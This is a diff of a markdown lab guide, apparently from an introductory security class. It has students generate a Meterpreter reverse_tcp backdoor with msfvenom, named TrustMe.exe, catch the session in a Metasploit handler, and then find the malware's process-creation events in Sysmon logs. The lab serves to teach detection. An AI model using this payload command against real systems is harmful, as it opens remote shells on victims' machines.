@@ -30,13 +30,13 @@ Please note the IP address of **your** Ethernet adapter.
 
 **Your IP Address and adapter name may be different.**
 
-Now, run the following commands to start a simple backdoor and backdoor listener: 
+Run the following commands to start a simple backdoor and backdoor listener: 
  
- <pre>sudo su -</pre>
+<pre>sudo su -</pre>
 
 <pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
-Now, let's start the **Metasploit** Handler.  First, open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
+Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
 
 ![](attachments/TaskbarKaliIcon.png)
 
@@ -64,7 +64,7 @@ It should look like this:
 
 ![](attachments/msfconsole.png)
 
-Now, we will need to open an **cmd.exe terminal as Administrator**.
+We will need to open a **"cmd.exe"** terminal as **Administrator**.
 
 ![](attachments/OpeningWindowsCommandPrompt.png)
 
@@ -88,7 +88,6 @@ Back at your Kali terminal, you should have a metasploit session!
 
 ![](attachments/meterpretersession.png)
 
-
 Now, we need to view the Sysmon events for this malware:
 
 Open **"Event Viewer"** by pressing the Windows key and searching for it.
@@ -110,4 +109,5 @@ Start at the top and work down through the logs, you should see your **malware**
 ![](attachments/processcreateview.png)
 
 ***
+
 [Back to Navigation Menu](/IntroClassFiles/navigation.md)
